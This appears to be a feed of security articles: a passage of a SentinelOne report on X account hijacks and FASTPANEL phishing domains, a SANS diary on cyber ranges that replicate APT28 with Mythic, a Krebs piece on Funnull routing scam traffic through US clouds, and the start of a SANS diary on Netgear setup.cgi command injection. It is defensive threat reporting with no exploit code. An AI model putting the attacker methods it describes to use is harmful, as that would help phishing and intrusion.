&lt;p&gt;FASTPANEL is a website hosting and building service that specializes in rapid building and management of websites. While FASTPANEL is not a malicious service, it is frequently abused by bad actors due to the ease of use, rapid scalability, and relatively low cost. FASTPANEL is routinely utilized by drainer gains and phishing campaigns, and is also included in associated guides and tutorials distributed throughout cybercrime communication channels.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113628" style="width: 1556px;"&gt;&lt;img alt="" class="size-full wp-image-113628" height="664" src="https://www.sentinelone.com/wp-content/uploads/2025/01/example-discussion-FASTPANEL.jpg" width="1556" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113628"&gt;Example discussion of FASTPANEL (RU crime forum)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Of the sites hosted on &lt;code&gt;84.38.130[.]20&lt;/code&gt;, the &lt;code&gt;buy-tanai[.]com&lt;/code&gt; and &lt;code&gt;emotionai[.]live&lt;/code&gt; sites still present the FASTPANEL landing pages as of this writing.&lt;/p&gt;
&lt;h2&gt;Publicly Linkable Activity&lt;/h2&gt;
&lt;h3&gt;Emerging Account Intrusions&lt;/h3&gt;
&lt;p&gt;While we have not yet established a high-confidence link, a recent compromise of a Tor Project account closely mirrors our observations. On January 30, 2025, the official X account for the Tor Project was breached. While it is possible that the same threat actor is responsible, we lack sufficient evidence to confirm the connection as of this writing.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113627" style="width: 1534px;"&gt;&lt;img alt="" class="size-full wp-image-113627" height="1018" src="https://www.sentinelone.com/wp-content/uploads/2025/01/x-tor-project-potential-comp.jpg" width="1534" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113627"&gt;X post from The Tor Project account on January 30, 2025 advising users of a potential compromise&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113626" style="width: 1522px;"&gt;&lt;img alt="" class="wp-image-113626 size-full" height="762" src="https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice.jpg" width="1522" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113626"&gt;Tor Project account compromise notice&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The Decentralized Autonomous Wireless Network (DAWN) was another victim of this type of attack. The threat actor &lt;a href="https://coinpedia.org/news/dawn-internets-x-account-hacked-phishing-scams-target-users-via-telegram/" rel="noopener noreferrer" target="_blank"&gt;leveraged&lt;/a&gt; the compromised DAWN-related social media accounts to lure victims into entering credentials into phishing pages targeting X and Telegram credentials.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113625" style="width: 1354px;"&gt;&lt;img alt="" class="size-full wp-image-113625" height="1358" src="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post.jpg" width="1354" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113625"&gt;DAWN X Posts&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The compromise of DAWN’s X accounts goes back to mid-January 2025.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113624" style="width: 960px;"&gt;&lt;img alt="" class="size-full wp-image-113624" height="1106" src="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post.jpg" width="960" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113624"&gt;January 14, 2025 &amp;#8211; DAWN rewards compromise post&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h3&gt;Crypto-Themed Project Placeholders&lt;/h3&gt;
&lt;p&gt;In some cases, we’ve observed cryptocurrency themed projects seemingly acting as placeholders for future use, or direct pump-and-dump schemes. In one example, &lt;code&gt;buy-tanai[.]com&lt;/code&gt; was &lt;a href="https://pump.fun/coin/G8pMUeoRVVDQu2hJSzxNPBGWtgtt5BjQ9nCT2BmVpump" rel="noopener noreferrer" target="_blank"&gt;pitched&lt;/a&gt; as such: “&lt;i&gt;$TANA AI. Dawn&amp;#8217;s AI project, Tana is the first AI-powered LP and trading agent, now live on the Solana blockchain.”&lt;/i&gt;&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113623" style="width: 1516px;"&gt;&lt;img alt="" class="size-full wp-image-113623" height="338" src="https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun.jpg" width="1516" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113623"&gt;Tana AI (TANA) on Pump[.]fun&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The domain&lt;code&gt;buy-tanai[.]com&lt;/code&gt; currently displays default FASTPANEL landing pages, suggesting it — along with other similar domains — is being staged for future attacks. Since FASTPANEL-managed sites can be rapidly updated, these domains serve as adaptable templates for phishing campaigns.&lt;/p&gt;
&lt;p&gt;Notably, TANA AI (TANA) was launched by Dawn in mid-January to promote AI-driven trading and liquidity provision in the cryptocurrency market. Despite losing most of its initial value within days, the currency remains actively traded across multiple decentralized exchanges.&lt;/p&gt;
&lt;p&gt;Given the crypto-related nature of these domains, it is likely that threat actors are using them as flexible phishing infrastructure. By keeping them as blank templates, they can quickly modify hosted content to align with ongoing campaigns as needed.&lt;/p&gt;
&lt;h3&gt;Crimeware Relations&lt;/h3&gt;
&lt;p&gt;Several other domains share overlaps in both use and unique infrastructure details, yet they represent a fork from the previously described high-profile social media profile attacks, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dataoptimix[.]com&lt;/li&gt;
&lt;li&gt;gamecodestudios[.]com&lt;/li&gt;
&lt;li&gt;shortwayscooter[.]com&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;Historical Connections&lt;/h3&gt;
&lt;p&gt;In mid-2024, a campaign used related infrastructure in similar phishing messages, including those which &lt;a href="https://www.sportskeeda.com/us/streamers/news-linus-sebastian-responds-linus-tech-tips-official-x-account-got-hacked" rel="noopener noreferrer" target="_blank"&gt;compromised the Linus Tech Tips&lt;/a&gt; Twitter account along with several other high profile users. At the time, @LinusTech had roughly 1.8million followers, which may represent the highest profile account successfully hijacked and linked to this actor.&lt;/p&gt;
&lt;figure class="wp-caption alignnone" id="attachment_113621" style="width: 852px;"&gt;&lt;img alt="" class="size-full wp-image-113621" height="1556" src="https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise.jpg" width="852" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-113621"&gt;Linus Tech Tips Twitter compromise&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;The cryptocurrency landscape offers financially-motivated threat actors multiple opportunities for profit and fraud. While marketing for coins and tokens has long been irreverent and meme-driven, recent developments have further blurred the line between legitimate projects and scams. &lt;/p&gt;
&lt;p&gt;A striking example occurred in January 2025, when the X account of the late crypto-enthusiast and antivirus founder John McAfee was reactivated to promote a new coin, &lt;a href="https://cryptoslate.com/john-mcafee-reborn-as-ai-memecoin-and-chatbot-with-27-million-market-cap/" rel="noopener noreferrer" target="_blank"&gt;$AIntivirus&lt;/a&gt;. The marketing style and brand voice of this purportedly legitimate token closely resemble tactics used in known scam campaigns, highlighting how easily crypto enthusiasts can be misled in an already murky ecosystem.&lt;/p&gt;
&lt;p&gt;To safeguard your X account, we strongly recommend using a unique password, enabling two-factor authentication (2FA), and avoiding credential sharing with third-party services. Be especially cautious of messages containing links to account alerts or security notices. Always verify URLs before clicking, and if a password reset is needed, initiate it directly through the official website or app rather than relying on unsolicited links.&lt;/p&gt;
&lt;p&gt;If you’ve encountered similar suspicious activity, we’d love to hear from you. Contact SentinelLABS at &lt;a href="mailto:ThreatTips@sentinelone.com" rel="noopener noreferrer" target="_blank"&gt;ThreatTips@sentinelone.com&lt;/a&gt;.&lt;/p&gt;

&lt;h1 dir="ltr"&gt;&lt;b id="docs-internal-guid-18f7e60d-7fff-f03a-e79c-11d44a3f848a"&gt;Introduction - To Simulate or Replicate&lt;/b&gt;&lt;/h1&gt;

&lt;p dir="ltr"&gt;In my experience with cybersecurity training, there's always this tug-of-war between using tools to simulate threats in a safe sandbox or going for the real deal by replicating actual attacks. To paraphrase; &amp;ldquo;To Simulate or not to Simulate, that is the question!&amp;rdquo; When we talk about simulation, I mean using tech like threat simulators where you can control everything down to the last byte. It's great for training because you can teach without the risk.&lt;/p&gt;

&lt;p dir="ltr"&gt;These tools do an amazing job and this is not a dig on any of them. Sometimes, you just have to take the type 2 approach [2].&lt;/p&gt;

&lt;p dir="ltr"&gt;When you replicate, you're building a digital mirror of real attacks. This is where you get the view into the &amp;quot;what if&amp;quot; moments. It is also where you can get your hands dirty with live behavior of malware and command and control. Sure, it's riskier, but the payoff in learning can be extremely useful. In my case, we settled on real &amp;lsquo;enough.&amp;rsquo;&lt;/p&gt;

&lt;h2 dir="ltr"&gt;&lt;b id="docs-internal-guid-18f7e60d-7fff-f03a-e79c-11d44a3f848a"&gt;The Problem&lt;/b&gt;&lt;/h2&gt;

&lt;p dir="ltr"&gt;Let's first acknowledge that no wheel was re-invented here. We went back to some basics. Routing, DNS and controlling what was executed and it worked [5].&lt;/p&gt;

&lt;ul dir="ltr"&gt;
	&lt;li&gt;&lt;em&gt;&lt;b id="docs-internal-guid-18f7e60d-7fff-f03a-e79c-11d44a3f848a"&gt;Safely&lt;/b&gt; building an infrastructure so students and users could enjoy non-simulated attacks. Replicate -&amp;gt; Delete -&amp;gt; Repeat. We had to control routing, control leakage, control execution and make this safe at scale.&lt;/em&gt;&lt;/li&gt;
	&lt;li&gt;&lt;em&gt;Have the environment and logs look as &lt;strong&gt;real &lt;/strong&gt;as possible [6].&lt;/em&gt;&lt;/li&gt;
	&lt;li&gt;&lt;em&gt;Use &lt;strong&gt;known &lt;/strong&gt;use-cases from current documented APT reports [7].&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 dir="ltr"&gt;The Solution&lt;br /&gt;
&amp;nbsp;&lt;/h2&gt;

&lt;p dir="ltr"&gt;&lt;b id="docs-internal-guid-18f7e60d-7fff-f03a-e79c-11d44a3f848a"&gt;&lt;em&gt;First,&amp;nbsp;Managed the Basics:&lt;/em&gt;&amp;nbsp;&lt;/b&gt;&amp;nbsp;Make sure you have 100% control over DNS, routing, and what was executed on the network. This provided the power to steer how the cyber range behaved, much like a conductor leading an orchestra. It started with hosts files, and evolved into controlling DNS servers, hence the above tool being shared.&lt;/p&gt;

&lt;p dir="ltr"&gt;&lt;b id="docs-internal-guid-18f7e60d-7fff-f03a-e79c-11d44a3f848a"&gt;&lt;em&gt;Next, Control the Environment: &lt;/em&gt;&lt;/b&gt;Pick&amp;nbsp;out known bad IP addresses from the internet's underbelly, those associated with Indicators of Compromise (IOCs). By squatting on these IPs and locking down their routes with static entries and firewall rules at the network's edge, a controlled&amp;nbsp;cyber-range is created. The example CSV in the applet used RFC 5737 and RFC 2606 for IP and domain examples. Make sure to adapt that, as example.test&amp;nbsp;just does not look convincing in logs [8]. FYI, our very own DShield is a good place to start looking if you need a range to use:&amp;nbsp;https://www.dshield.org/block.txt&lt;/p&gt;

&lt;p dir="ltr"&gt;&lt;b id="docs-internal-guid-18f7e60d-7fff-f03a-e79c-11d44a3f848a"&gt;&lt;em&gt;Then, Craft the Tools: &lt;/em&gt;&lt;/b&gt;I&amp;nbsp;decided to build our attack tools from the bad guys lens and design our own game space. We tested many of the frameworks and went with Mythic and modeling APT28 and tweaking it to fit our unique setup. This way, we controlled exactly how the &amp;quot;bad guys&amp;quot; played [9]. We selected Mythic for many reasons, however do check out their Jupyter Notebooks!&lt;/p&gt;

&lt;p dir="ltr"&gt;&lt;b id="docs-internal-guid-18f7e60d-7fff-f03a-e79c-11d44a3f848a"&gt;Building the Network: &lt;/b&gt;We set up the network topology using tools like Ansible and Terraform for repeatability. Think of it as setting the stage - you could expect to see code for this in future diaries [10].&lt;br /&gt;
&amp;nbsp;&lt;/p&gt;

&lt;h2 dir="ltr"&gt;Finally, Tested and Validated&lt;/h2&gt;

&lt;p dir="ltr"&gt;&lt;br /&gt;
I tested for route leakage.&amp;nbsp;This is what prompted more than one layer of Firewalls. We had three firewalls in place, two in the primary gamespace&amp;nbsp;with a final gatekeeper. There are dynamic lists that populate the border as a third layer of control importing our cyber-squating space. To summarize, control resultion, control routing, then filter at the border of the lab.&amp;nbsp;[11]. Let me know if you want a deeper dive on this?&lt;/p&gt;

&lt;h2&gt;Conclusion, Keep it Simple&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;
Over the past year, I've been involved in constructing cyber ranges specifically for replication purposes. When you are asked to do this more than nTimes, where n = the number of times that cause you to lose it and code over the weekend, you automate. Sometimes old methods apply. If this is of interest to the community, let me&amp;nbsp;know in the comments below and I will clean up and release more of the micro-tools assembled to make this all work?&lt;/p&gt;

&lt;p&gt;In an effort to blend in and make their malicious traffic tougher to block, hosting firms catering to cybercriminals in China and Russia increasingly are funneling their operations through major U.S. cloud providers. Research published this week on one such outfit &amp;#8212; a sprawling network tied to Chinese organized crime gangs and aptly named &amp;#8220;&lt;strong&gt;Funnull&lt;/strong&gt;&amp;#8221; &amp;#8212; highlights a persistent whac-a-mole problem facing cloud services.&lt;/p&gt;
&lt;p&gt;In October 2024, the security firm &lt;strong&gt;Silent Push&lt;/strong&gt; published a &lt;a href="https://www.silentpush.com/blog/triad-nexus-funnull/" rel="noopener" target="_blank"&gt;lengthy analysis&lt;/a&gt; of how &lt;strong&gt;Amazon AWS&lt;/strong&gt; and &lt;strong&gt;Microsoft Azure&lt;/strong&gt; were providing services to Funnull, a two-year-old Chinese content delivery network that hosts a wide variety of fake trading apps, &lt;a href="https://krebsonsecurity.com/2022/07/massive-losses-define-epidemic-of-pig-butchering/" rel="noopener" target="_blank"&gt;pig butchering scams&lt;/a&gt;, gambling websites, and retail phishing pages.&lt;/p&gt;
&lt;p&gt;Funnull made headlines last summer after it acquired the domain name &lt;strong&gt;polyfill[.]io&lt;/strong&gt;, previously the home of a widely-used open source code library that allowed older browsers to handle advanced functions that weren&amp;#8217;t natively supported. There were still tens of thousands of legitimate domains linking to the Polyfill domain at the time of its acquisition, and Funnull soon after &lt;a href="https://arstechnica.com/security/2024/07/384000-sites-link-to-code-library-caught-performing-supply-chain-attack/" rel="noopener" target="_blank"&gt;conducted a supply-chain attack that redirected visitors to malicious sites&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Silent Push&amp;#8217;s October 2024 report found a vast number of domains hosted via Funnull promoting gambling sites that bear the logo of the &lt;strong&gt;Suncity Group&lt;/strong&gt;, a Chinese entity named in &lt;a href="https://www.unodc.org/roseap/uploads/documents/Publications/2024/Casino_Underground_Banking_Report_2024.pdf" rel="noopener" target="_blank"&gt;a 2024 UN report&lt;/a&gt; (PDF) for laundering millions of dollars for the North Korean &lt;a href="https://en.wikipedia.org/wiki/Lazarus_Group" rel="noopener" target="_blank"&gt;Lazarus Group&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In 2023, Suncity’s CEO was &lt;a href="https://www.smh.com.au/business/companies/ex-suncity-boss-alvin-chau-jailed-for-18-years-in-macau-20230118-p5cdmj.html" rel="noopener" target="_blank"&gt;sentenced to 18 years in prison&lt;/a&gt; on charges of fraud, illegal gambling, and “&lt;a href="https://en.wikipedia.org/wiki/Triad_(organized_crime)" rel="noopener" target="_blank"&gt;triad&lt;/a&gt; offenses,” i.e. working with Chinese transnational organized crime syndicates. Suncity is alleged to have built an underground banking system that &lt;a href="https://macaonews.org/news/city/former-suncity-boss-alvin-chau-sentenced-to-18-years-in-prison/" rel="noopener" target="_blank"&gt;laundered billions of dollars for criminals&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It is likely the gambling sites coming through Funnull are abusing top casino brands as part of their money laundering schemes. In reporting on Silent Push&amp;#8217;s October report, &lt;em&gt;TechCrunch&lt;/em&gt; &lt;a href="https://techcrunch.com/2024/10/22/researchers-link-polyfill-supply-chain-attack-to-huge-network-of-copycat-gambling-sites/" rel="noopener" target="_blank"&gt;obtained&lt;/a&gt; a comment from Bwin, one of the casinos being advertised en masse through Funnull, and Bwin said those websites did not belong to them.&lt;/p&gt;
&lt;p&gt;Gambling is illegal in China except in Macau, a special administrative region of China. Silent Push researchers say Funnull may be helping online gamblers in China evade the Communist party&amp;#8217;s &amp;#8220;Great Firewall,&amp;#8221; which blocks access to gambling destinations.&lt;/p&gt;
&lt;p&gt;Silent Push&amp;#8217;s &lt;strong&gt;Zach Edwards&lt;/strong&gt; said that upon &lt;a href="https://www.silentpush.com/blog/infrastructure-laundering/" rel="noopener" target="_blank"&gt;revisiting Funnull&amp;#8217;s infrastructure again this month&lt;/a&gt;, they found dozens of the same Amazon and Microsoft cloud Internet addresses still forwarding Funnull traffic through a dizzying chain of auto-generated domain names before redirecting malicious or phishous websites.&lt;/p&gt;
&lt;p&gt;Edwards said Funnull is a textbook example of an increasing trend Silent Push calls &amp;#8220;infrastructure laundering,&amp;#8221; wherein crooks selling cybercrime services will relay some or all of their malicious traffic through U.S. cloud providers.&lt;/p&gt;
&lt;p&gt;&amp;#8220;It&amp;#8217;s crucial for global hosting companies based in the West to wake up to the fact that extremely low quality and suspicious web hosts based out of China are deliberately renting IP space from multiple companies and then mapping those IPs to their criminal client websites,&amp;#8221; Edwards told KrebsOnSecurity. &amp;#8220;We need these major hosts to create internal policies so that if they are renting IP space to one entity, who further rents it to host numerous criminal websites, all of those IPs should be reclaimed and the CDN who purchased them should be banned from future IP rentals or purchases.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70232" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-70232" height="370" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/suncity-funnull.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70232"&gt;A Suncity gambling site promoted via Funnull. The sites feature a prompt for a Tether/USDT deposit program.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Reached for comment, Amazon referred this reporter to a statement Silent Push included in &lt;a href="https://www.silentpush.com/blog/infrastructure-laundering" rel="noopener" target="_blank"&gt;a report released today&lt;/a&gt;. Amazon said AWS was already aware of the Funnull addresses tracked by Silent Push, and that it had suspended all known accounts linked to the activity.&lt;/p&gt;
&lt;p&gt;Amazon said that contrary to implications in the Silent Push report, it has every reason to aggressively police its network against this activity, noting the accounts tied to Funnull used &amp;#8220;fraudulent methods to temporarily acquire infrastructure, for which it never pays. Thus, AWS incurs damages as a result of the abusive activity.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;When AWS&amp;#8217;s automated or manual systems detect potential abuse, or when we receive reports of potential abuse, we act quickly to investigate and take action to stop any prohibited activity,&amp;#8221; Amazon&amp;#8217;s statement continues. &amp;#8220;In the event anyone suspects that AWS resources are being used for abusive activity, we encourage them to report it to AWS Trust &amp;amp; Safety using the &lt;a href="https://support.aws.amazon.com/#/contacts/report-abuse" rel="noopener" target="_blank"&gt;report abuse form&lt;/a&gt;. In this case, the authors of the report never notified AWS of the findings of their research via our easy-to-find security and abuse reporting channels. Instead, AWS first learned of their research from a journalist to whom the researchers had provided a draft.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Microsoft likewise said it takes such abuse seriously, and encouraged others to report suspicious activity found on its network.&lt;/p&gt;
&lt;p&gt;&amp;#8220;We are committed to protecting our customers against this kind of activity and actively enforce acceptable use policies when violations are detected,&amp;#8221; Microsoft said in a written statement. &amp;#8220;We encourage &lt;a href="https://protect.checkpoint.com/v2/r01/___https://msrc.microsoft.com/report/___.YzJ1OndlY29tbXVuaWNhdGlvbnM6YzpvOjQwMWQyNWE1OWIxMDNiNWUyZGQ5ZmY2MmZiYTMxMTNiOjc6NDRlNzoyZDg4NzY5MmI4MGVmYWY2M2NmZWVjOGMxMjhkNTRhYjhmODc4Mzk3MjJkYjdkMTEzMjk0MDdmMzA4NDUxNDczOmg6VDpG" rel="noopener" target="_blank"&gt;reporting&lt;/a&gt; suspicious activity to Microsoft so we can investigate and take appropriate actions.&amp;#8221;&lt;span id="more-70065"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Richard Hummel&lt;/strong&gt; is threat intelligence lead at &lt;strong&gt;NETSCOUT&lt;/strong&gt;. Hummel said it used to be that &amp;#8220;noisy&amp;#8221; and frequently disruptive malicious traffic &amp;#8212; such as automated application layer attacks, and &amp;#8220;brute force&amp;#8221; efforts to crack passwords or find vulnerabilities in websites &amp;#8212; came mostly from botnets, or large collections of hacked devices.&lt;/p&gt;
&lt;p&gt;But he said the vast majority of the infrastructure used to funnel this type of traffic is now proxied through major cloud providers, which can make it difficult for organizations to block at the network level.&lt;/p&gt;
&lt;p&gt;&amp;#8220;From a defenders point of view, you can&amp;#8217;t wholesale block cloud providers, because a single IP can host thousands or tens of thousands of domains,&amp;#8221; Hummel said.&lt;/p&gt;
&lt;p&gt;In May 2024, KrebsOnSecurity published &lt;a href="https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/" rel="noopener" target="_blank"&gt;a deep dive on Stark Industries Solutions&lt;/a&gt;, an ISP that materialized at the start of Russia&amp;#8217;s invasion of Ukraine and has been used as a global proxy network that conceals the true source of cyberattacks and disinformation campaigns against enemies of Russia. Experts said much of the malicious traffic  traversing Stark&amp;#8217;s network (e.g. vulnerability scanning and password brute force attacks) was being bounced through U.S.-based cloud providers.&lt;/p&gt;
&lt;p&gt;Stark&amp;#8217;s network has been a favorite of the Russian hacktivist group called &lt;strong&gt;NoName057(16)&lt;/strong&gt;, which frequently launches huge distributed denial-of-service (DDoS) attacks against a variety of targets seen as opposed to Moscow. Hummel said NoName&amp;#8217;s history suggests they are adept at cycling through new cloud provider accounts, making anti-abuse efforts into a game of whac-a-mole.&lt;/p&gt;
&lt;p&gt;&amp;#8220;It almost doesn&amp;#8217;t matter if the cloud provider is on point and takes it down because the bad guys will just spin up a new one,&amp;#8221; he said. &amp;#8220;Even if they&amp;#8217;re only able to use it for an hour, they&amp;#8217;ve already done their damage. It&amp;#8217;s a really difficult problem.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Edwards said Amazon declined to specify whether the banned Funnull users were operating using compromised accounts or stolen payment card data, or something else.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I&amp;#8217;m surprised they wanted to lean into &amp;#8216;We&amp;#8217;ve caught this 1,200+ times and have taken these down!&amp;#8217; and yet didn&amp;#8217;t connect that each of those IPs was mapped to [the same] Chinese CDN,&amp;#8221; he said. &amp;#8220;We&amp;#8217;re just thankful Amazon confirmed that account mules are being used for this and it isn&amp;#8217;t some front-door relationship. We haven&amp;#8217;t heard the same thing from Microsoft but it&amp;#8217;s very likely that the same thing is happening.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Funnull wasn&amp;#8217;t always a bulletproof hosting network for scam sites. Prior to 2022, the network was known as &lt;strong&gt;Anjie CDN&lt;/strong&gt;, based in the Philippines. One of Anjie&amp;#8217;s properties was a website called &lt;strong&gt;funnull[.]app&lt;/strong&gt;. Loading that domain reveals a pop-up message by the original Anjie CDN owner, who said their operations had been seized by an entity known as &lt;strong&gt;Fangneng CDN&lt;/strong&gt; and &lt;strong&gt;ACB Group&lt;/strong&gt;, the parent company of Funnull.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70228" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-70228" height="533" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/funnull-app.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70228"&gt;A machine-translated message from the former owner of Anjie CDN, a Chinese content delivery network that is now Funnull.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;&amp;#8220;After I got into trouble, the company was managed by my family,&amp;#8221; the message explains. &amp;#8220;Because my family was isolated and helpless, they were persuaded by villains to sell the company. Recently, many companies have contacted my family and threatened them, believing that Fangneng CDN used penetration and mirroring technology through customer domain names to steal member information and financial transactions, and stole customer programs by renting and selling servers. This matter has nothing to do with me and my family. Please contact Fangneng CDN to resolve it.&amp;#8221;&lt;/p&gt;
&lt;p&gt;In January 2024, the &lt;strong&gt;U.S. Department of Commerce&lt;/strong&gt; issued &lt;a href="https://www.federalregister.gov/documents/2024/01/29/2024-01580/taking-additional-steps-to-address-the-national-emergency-with-respect-to-significant-malicious" rel="noopener" target="_blank"&gt;a proposed rule&lt;/a&gt; that would require cloud providers to create a &amp;#8220;Customer Identification Program&amp;#8221; that includes procedures to collect data sufficient to determine whether each potential customer is a foreign or U.S. person.&lt;/p&gt;
&lt;p&gt;According to the law firm &lt;strong&gt;Crowell &amp;amp; Moring LLP&lt;/strong&gt;, the Commerce rule also would require &amp;#8220;infrastructure as a service&amp;#8221; (IaaS) providers to report knowledge of any transactions with foreign persons that might allow the foreign entity to train a large AI model with potential capabilities that could be used in malicious cyber-enabled activity.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The proposed rulemaking has garnered global attention, as its cross-border data collection requirements are unprecedented in the cloud computing space,&amp;#8221; Crowell &lt;a href="https://www.crowell.com/en/insights/client-alerts/who-iaas-your-foreign-customer-department-of-commerce-proposes-foreign-customer-identification-requirements-for-us-iaas-providers" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt;. &amp;#8220;To the extent the U.S. alone imposes these requirements, there is concern that U.S. IaaS providers could face a competitive disadvantage, as U.S. allies have not yet announced similar foreign customer identification requirements.&amp;#8221;&lt;/p&gt;
&lt;p&gt;It remains unclear if the new White House administration will push forward with the requirements. The Commerce action was mandated as part of an executive order President Trump issued a day before leaving office in January 2021.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70065</guid><category>A Little Sunshine</category><category>Ne'er-Do-Well News</category><category>Time to Patch</category><category>Web Fraud 2.0</category><category>ACB Group</category><category>Amazon AWS</category><category>Anjie CDN</category><category>Crowell &amp; Moring LLP</category><category>Fangneng CDN</category><category>Funnull</category><category>infrastructure laundering</category><category>Microsoft Azure</category><category>NETSCOUT</category><category>NoName057(16)</category><category>polyfill</category><category>Richard Hummel</category><category>Silent Push</category><category>Suncity Group</category><category>U.S. Department of Commerce</category><category>Zach Edwards</category></item><item><title>PCAPs or It Didn't Happen: Exposing an Old Netgear Vulnerability Still Active in 2025 &amp;#x5b;Guest Diary&amp;#x5d;, (Thu, Jan 30th)</title><link>https://isc.sans.edu/diary/rss/31638</link><description>&lt;p&gt;&amp;#x5b;This is a Guest Diary by David Watson, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program&amp;#x5d;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;[This is a Guest Diary by David Watson, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program]&lt;/p&gt;

&lt;p&gt;One thing I&amp;rsquo;ve learned about cybersecurity, particularly during my time here at the Internet Storm Center is this: If you don&amp;rsquo;t capture detailed network data (like PCAPs), you can easily miss the full picture of an attack, even with the most aggressive logging practices.&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
One of the attack observations I submitted on January 12th detailed an older vulnerability that uses HTTP GET requests, attempting to perform unauthenticated OS command injections on some legacy Netgear devices, targeting the &amp;lsquo;setup.cgi&amp;rsquo; script. I was curious as to which Netgear devices might be involved, and some research led me to a few publications on exploit-db.com, which identified specifically the DGN1000 with firmware versions before 1.1.0.48, and the DGN2200v1 (all firmware versions) modem/router models.[&lt;a href="https://www.exploit-db.com/exploits/25978"&gt;2&lt;/a&gt;][&lt;a href="https://www.exploit-db.com/exploits/43055"&gt;3&lt;/a&gt;] Both of these models are shown to be &amp;ldquo;end of service&amp;rdquo; on the Netgear website. [&lt;a href="https://www.netgear.com/support/product/dgn2200v1/"&gt;4&lt;/a&gt;][&lt;a href="https://www.netgear.com/support/product/dgn1000/"&gt;5&lt;/a&gt;] There was no CVE mentioned, but a few days later I found out from another post on the 15th of January here at the Internet Storm Center, written by Dr. Yee Ching Tok, Ph.D., ISC Handler:&lt;/p&gt;

&lt;p&gt;&amp;ldquo;This vulnerability was only formally registered in the CVE database in 2024 although it was first disclosed in May 2013, and the corresponding CVE entry was published recently on January 10, 2025.&amp;rdquo; [&lt;a href="https://isc.sans.edu/diary/The+Curious+Case+of+a+12YearOld+Netgear+Router+Vulnerability/31592"&gt;6&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;CVE-2024-12847 has a CVSS score of 9.8 as shown on NIST.gov. [&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12847"&gt;7&lt;/a&gt;] This post will illustrate how I found this in my logs, why it matters, and how packet captures and Zeek logs proved essential.&lt;/p&gt;

&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;An Older Vulnerability Resurfaces&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Netgear&amp;rsquo;s DGN1000 and DGN2200v1 devices are end-of-life (EOL) devices. The bug sits in a script called &amp;lsquo;setup.cgi&amp;rsquo;, (cgi = Common Gateway Interface) which is meant for administrative management of the router. Attackers discovered that by passing certain parameters, one can execute arbitrary OS commands on the router&amp;rsquo;s underlying Linux operating system as root, without any authentication checks. Over the last several months my web logs showed 257 suspicious HTTP GET requests from 16 unique IP addresses to &amp;lsquo;/setup.cgi&amp;rsquo;.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic1.png" style="width: 600px; height: 309px;" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic2.png" style="width: 600px; height: 270px;" /&gt;&lt;/p&gt;

